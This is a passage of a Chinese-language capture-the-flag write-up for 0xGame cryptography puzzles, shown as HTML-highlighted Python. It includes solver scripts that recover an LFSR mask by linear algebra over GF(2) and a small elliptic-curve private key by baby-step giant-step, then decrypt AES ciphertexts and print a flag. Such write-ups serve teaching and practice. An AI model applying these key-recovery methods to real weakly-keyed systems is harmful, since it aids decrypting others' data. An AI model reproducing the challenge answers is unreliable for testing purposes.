class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_bits</span>(<span class="params">x, bit_length</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将整数转为比特列表，高位在前&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> [(x &gt;&gt; i) &amp; <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(bit_length))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bits_to_int</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将比特列表转为整数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bits), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lfsr_step</span>(<span class="params">state, mask, length=<span class="number">128</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;模拟LFSR的一步&quot;&quot;&quot;</span></span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        output ^= state[i] &amp; mask[i]</span><br><span class="line">    new_state = state[<span class="number">1</span>:] + [output]</span><br><span class="line">    <span class="keyword">return</span> new_state, output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_mask_from_keystream</span>(<span class="params">keystream, n=<span class="number">128</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从密钥流恢复mask&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 构建线性方程组: 对于 i = n 到 2n-1</span></span><br><span class="line">    <span class="comment"># keystream[i] = mask · [keystream[i-n], ..., keystream[i-1]]</span></span><br><span class="line">    A = []</span><br><span class="line">    b = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n, <span class="number">2</span>*n):</span><br><span class="line">        <span class="comment"># 状态向量是前n个输出比特</span></span><br><span class="line">        state_vector = keystream[i-n:i]</span><br><span class="line">        A.append(state_vector)</span><br><span class="line">        b.append(keystream[i])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># GF(2)上的高斯消元</span></span><br><span class="line">    size = n</span><br><span class="line">    mat = [row + [b[i]] <span class="keyword">for</span> i, row <span class="keyword">in</span> <span class="built_in">enumerate</span>(A)]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 前向消元</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        <span class="comment"># 找到主元</span></span><br><span class="line">        pivot = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(col, size):</span><br><span class="line">            <span class="keyword">if</span> mat[row][col] == <span class="number">1</span>:</span><br><span class="line">                pivot = row</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> pivot == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 交换行</span></span><br><span class="line">        mat[col], mat[pivot] = mat[pivot], mat[col]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 消去其他行</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(col + <span class="number">1</span>, size):</span><br><span class="line">            <span class="keyword">if</span> mat[row][col] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(col, size + <span class="number">1</span>):</span><br><span class="line">                    mat[row][j] ^= mat[col][j]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 回代求解</span></span><br><span class="line">    mask = [<span class="number">0</span>] * size</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(size)):</span><br><span class="line">        <span class="keyword">if</span> mat[i][i] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> mat[i][size] == <span class="number">0</span>:</span><br><span class="line">                <span class="comment"># 自由变量，设为0</span></span><br><span class="line">                mask[i] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;矛盾方程 at row <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mask[i] = mat[i][size]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, size):</span><br><span class="line">                mask[i] ^= mat[i][j] &amp; mask[j]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> mask</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知数据</span></span><br><span class="line">random1 = <span class="number">79262982171792651683253726993186021794</span></span><br><span class="line">random2 = <span class="number">121389030069245976625592065270667430301</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;\xb9WE&lt;\x8bC\xab\x92J7\xa9\xe6\xe8\xd8\x93D\xcc\xac\xfdvfZ&#125;C\xe6\xd8;\xf7\x18\xbauz`\xb9\xe0\xe6\xc6\xae\x00\xfb\x96%;k&#123;Ph\xfa&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;分析LFSR...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查数值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;random1: <span class="subst">&#123;random1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;random2: <span class="subst">&#123;random2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;random1 比特长度: <span class="subst">&#123;random1.bit_length()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;random2 比特长度: <span class="subst">&#123;random2.bit_length()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转为比特序列（确保128位）</span></span><br><span class="line">bits1 = int_to_bits(random1, <span class="number">128</span>)</span><br><span class="line">bits2 = int_to_bits(random2, <span class="number">128</span>)</span><br><span class="line">keystream = bits1 + bits2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;密钥流长度: <span class="subst">&#123;<span class="built_in">len</span>(keystream)&#125;</span> 比特&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法1: 直接解线性方程组</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n方法1: 解线性方程组...&quot;</span>)</span><br><span class="line">mask_bits = recover_mask_from_keystream(keystream)</span><br><span class="line"><span class="keyword">if</span> mask_bits:</span><br><span class="line">    mask = bits_to_int(mask_bits)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;找到 mask: <span class="subst">&#123;<span class="built_in">hex</span>(mask)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证mask</span></span><br><span class="line">    test_state = bits1[:]  <span class="comment"># 初始状态是random1的比特</span></span><br><span class="line">    test_mask = mask_bits</span><br><span class="line">    generated = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        test_state, out = lfsr_step(test_state, test_mask)</span><br><span class="line">        generated.append(out)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查是否匹配</span></span><br><span class="line">    <span class="keyword">if</span> generated[<span class="number">128</span>:<span class="number">256</span>] == bits2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;✓ Mask 验证成功!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;✗ Mask 验证失败&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解密</span></span><br><span class="line">    <span class="keyword">for</span> order <span class="keyword">in</span> [<span class="string">&#x27;big&#x27;</span>, <span class="string">&#x27;little&#x27;</span>]:</span><br><span class="line">        key = mask.to_bytes(<span class="number">16</span>, order)</span><br><span class="line">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;order&#125;</span> 顺序解密:&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            decoded = plaintext.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;解码: <span class="subst">&#123;decoded&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;0xGame&#x27;</span> <span class="keyword">in</span> decoded <span class="keyword">or</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> decoded <span class="keyword">or</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">in</span> decoded:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;*** 找到 flag! ***&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;原始字节: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;方法1失败&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2: 如果上面失败，尝试暴力搜索附近的mask值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n方法2: 尝试附近可能的mask值...&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> mask_bits:</span><br><span class="line">    base_mask = bits_to_int(mask_bits)</span><br><span class="line">    <span class="comment"># 尝试一些变体</span></span><br><span class="line">    <span class="keyword">for</span> shift <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">10</span>, <span class="number">11</span>):</span><br><span class="line">        test_mask = (base_mask + shift) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">128</span>) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> order <span class="keyword">in</span> [<span class="string">&#x27;big&#x27;</span>, <span class="string">&#x27;little&#x27;</span>]:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                key = test_mask.to_bytes(<span class="number">16</span>, order)</span><br><span class="line">                cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">                plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;0xGame&#x27;</span> <span class="keyword">in</span> plaintext:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;找到 flag! mask=<span class="subst">&#123;<span class="built_in">hex</span>(test_mask)&#125;</span>, order=<span class="subst">&#123;order&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>得到<code>0xGame&#123;124ab3f1-4c3e-4d2a-8e6f-9b5e6c7d8f90&#125;</code></p>
<h2 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h2><p>大步小步法计算私钥s。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===============================================================</span></span><br><span class="line"><span class="comment"># 第一部分：椭圆曲线和 Point 类的定义</span></span><br><span class="line"><span class="comment"># ===============================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 椭圆曲线 secp256r1 (NIST P-256) 的参数</span></span><br><span class="line">p = <span class="number">0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff</span></span><br><span class="line">a = <span class="number">0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc</span></span><br><span class="line">b = <span class="number">0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 辅助函数：计算模逆元</span></span><br><span class="line"><span class="comment"># 使用扩展欧几里得算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">n, p</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(n, p - <span class="number">2</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    一个表示 secp256r1 椭圆曲线上点的类</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        <span class="variable language_">self</span>.x = x</span><br><span class="line">        <span class="variable language_">self</span>.y = y</span><br><span class="line">        <span class="variable language_">self</span>.a = a</span><br><span class="line">        <span class="variable language_">self</span>.b = b</span><br><span class="line">        <span class="variable language_">self</span>.p = p</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义点加法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="comment"># 处理无穷远点 (用 None 表示)</span></span><br><span class="line">        <span class="keyword">if</span> other <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 两个点相同，执行点倍增</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span> == other:</span><br><span class="line">            <span class="comment"># lam = (3 * x^2 + a) / (2 * y) mod p</span></span><br><span class="line">            lam = (<span class="number">3</span> * <span class="variable language_">self</span>.x * <span class="variable language_">self</span>.x + <span class="variable language_">self</span>.a) * inv(<span class="number">2</span> * <span class="variable language_">self</span>.y, <span class="variable language_">self</span>.p) % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="keyword">else</span>: <span class="comment"># 两个点不同</span></span><br><span class="line">            <span class="comment"># lam = (y2 - y1) / (x2 - x1) mod p</span></span><br><span class="line">            lam = (other.y - <span class="variable language_">self</span>.y) * inv(other.x - <span class="variable language_">self</span>.x, <span class="variable language_">self</span>.p) % <span class="variable language_">self</span>.p</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算新点的坐标</span></span><br><span class="line">        <span class="comment"># x3 = lam^2 - x1 - x2 mod p</span></span><br><span class="line">        x3 = (lam * lam - <span class="variable language_">self</span>.x - other.x) % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="comment"># y3 = lam * (x1 - x3) - y1 mod p</span></span><br><span class="line">        y3 = (lam * (<span class="variable language_">self</span>.x - x3) - <span class="variable language_">self</span>.y) % <span class="variable language_">self</span>.p</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> Point(x3, y3)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义标量乘法 (s * P)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, s</span>):</span><br><span class="line">        current = <span class="variable language_">self</span></span><br><span class="line">        res = <span class="literal">None</span> <span class="comment"># 这是无穷远点</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用快速幂的思想 (二进制展开法)</span></span><br><span class="line">        <span class="keyword">while</span> s &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> s &amp; <span class="number">1</span>: <span class="comment"># 如果当前位是 1</span></span><br><span class="line">                <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    res = current</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res = res + current</span><br><span class="line">            current = current + current <span class="comment"># 点倍增</span></span><br><span class="line">            s &gt;&gt;= <span class="number">1</span> <span class="comment"># 右移一位</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义点的相等性</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> other <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.x == other.x <span class="keyword">and</span> <span class="variable language_">self</span>.y == other.y</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 为了能将 Point 对象作为字典的键，需要定义 __hash__</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>((<span class="variable language_">self</span>.x, <span class="variable language_">self</span>.y))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 定义点的相反数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__neg__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> Point(<span class="variable language_">self</span>.x, -<span class="variable language_">self</span>.y % <span class="variable language_">self</span>.p)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方便打印</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;(<span class="subst">&#123;self.x&#125;</span>, <span class="subst">&#123;self.y&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===============================================================</span></span><br><span class="line"><span class="comment"># 第二部分：实现并运行大步小步法 (BSGS) 来找到 s</span></span><br><span class="line"><span class="comment"># ===============================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bsgs</span>(<span class="params">base_point, target_point, search_limit</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用大步小步法求解椭圆曲线离散对数问题 (s * base_point = target_point)</span></span><br><span class="line"><span class="string">    :param base_point: 基点 P</span></span><br><span class="line"><span class="string">    :param target_point: 目标点 Q</span></span><br><span class="line"><span class="string">    :param search_limit: s 的最大搜索范围 (2^40)</span></span><br><span class="line"><span class="string">    :return: 整数 s</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    m = <span class="built_in">int</span>(math.sqrt(search_limit)) + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;步长 (m) 设置为: <span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 计算小步 (Baby Steps) 并存入哈希表</span></span><br><span class="line">    baby_steps_table = &#123;&#125;</span><br><span class="line">    current_point = <span class="literal">None</span> <span class="comment"># 0 * P</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> current_point <span class="keyword">not</span> <span class="keyword">in</span> baby_steps_table:</span><br><span class="line">            baby_steps_table[current_point] = j</span><br><span class="line">        <span class="keyword">if</span> current_point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            current_point = base_point</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            current_point = current_point + base_point</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;小步表已生成完成。&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 计算大步的步进 (mP)</span></span><br><span class="line">    mP = base_point * m</span><br><span class="line">    mP_inv = -mP</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 计算大步 (Giant Steps) 并查找匹配</span></span><br><span class="line">    giant_step_point = target_point</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="comment"># 查找 Q - i*m*P 是否在小步表中</span></span><br><span class="line">        <span class="keyword">if</span> giant_step_point <span class="keyword">in</span> baby_steps_table:</span><br><span class="line">            j = baby_steps_table[giant_step_point]</span><br><span class="line">            s = i * m + j</span><br><span class="line">            <span class="comment"># 由于0*P和负点的情况，可能需要微调</span></span><br><span class="line">            <span class="keyword">if</span> base_point * s == target_point:</span><br><span class="line">                 <span class="keyword">return</span> s</span><br><span class="line">        giant_step_point = giant_step_point + mP_inv</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span> <span class="comment"># 没有找到解</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===============================================================</span></span><br><span class="line"><span class="comment"># 第三部分：整合并执行解密</span></span><br><span class="line"><span class="comment"># ===============================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 题目中给出的 P 和 Q 的坐标</span></span><br><span class="line">    P_coords = (<span class="number">96072097493962089165616681758527365503518618338657020069385515845050052711198</span>, <span class="number">106207812376588552122608666685749118279489006020794136421111385490430195590894</span>)</span><br><span class="line">    Q_coords = (<span class="number">100307267283773399335731485631028019332040775774395440323669585624446229655081</span>, <span class="number">22957963484284064705317349990185223707693957911321089428005116099172185773154</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建 Point 对象</span></span><br><span class="line">    P = Point(P_coords[<span class="number">0</span>], P_coords[<span class="number">1</span>])</span><br><span class="line">    Q = Point(Q_coords[<span class="number">0</span>], Q_coords[<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># s 的最大值是 2^40</span></span><br><span class="line">    search_space = <span class="number">2</span>**<span class="number">40</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在使用大步小步法计算私钥 s，这可能需要一分钟左右...&quot;</span>)</span><br><span class="line">    s = bsgs(P, Q, search_space)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;成功找到私钥 s: <span class="subst">&#123;s&#125;</span>\n&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用找到的 s 进行解密</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在使用 s 生成密钥并解密...&quot;</span>)</span><br><span class="line">        key = sha256(<span class="built_in">str</span>(s).encode()).digest()</span><br><span class="line">        </span><br><span class="line">        ciphertext = <span class="string">b&#x27;:\xe5^\xd2s\x92kX\x96\x12\xb7dT\x1am\x94\x86\xcd.\x84*-\x93\xb5\x14\x8d\x99\x94\x92\xfaCE\xbd\x01&amp;?\xe1\x01f\xef\x8f\xe3\x13\x13\x96\xa6\x0f\xc0&#x27;</span></span><br><span class="line">        </span><br><span class="line">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        </span><br><span class="line">        decrypted_padded = cipher.decrypt(ciphertext)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 去除 PKCS7 填充</span></span><br><span class="line">        padding_len = decrypted_padded[-<span class="number">1</span>]</span><br><span class="line">        flag = decrypted_padded[:-padding_len]</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;解密成功！ Flag 是: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;解密成功！ Flag (原始字节): <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未能找到 s。&quot;</span>)</span><br></pre></td></tr></table></figure>

